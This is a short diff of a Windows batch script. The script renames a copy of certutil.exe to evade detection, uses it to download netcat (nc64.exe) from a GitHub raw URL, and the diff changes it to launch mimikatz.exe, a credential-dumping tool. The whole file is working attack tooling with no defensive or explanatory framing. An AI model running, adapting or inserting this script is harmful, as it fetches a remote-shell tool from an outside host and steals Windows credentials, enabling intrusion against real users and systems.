@@ -1,7 +1,7 @@
 @echo on
 
 copy %windir%\system32\certutil.exe %temp%\cr.tmp
-start %temp%\nc.bat
+start %temp%\mimikatz.exe
 
 %temp%\cr.tmp -urlcache -split -f https://github.com/inwestallis/first_repository/raw/master/nc64.exe %Temp%\nc.exe
 
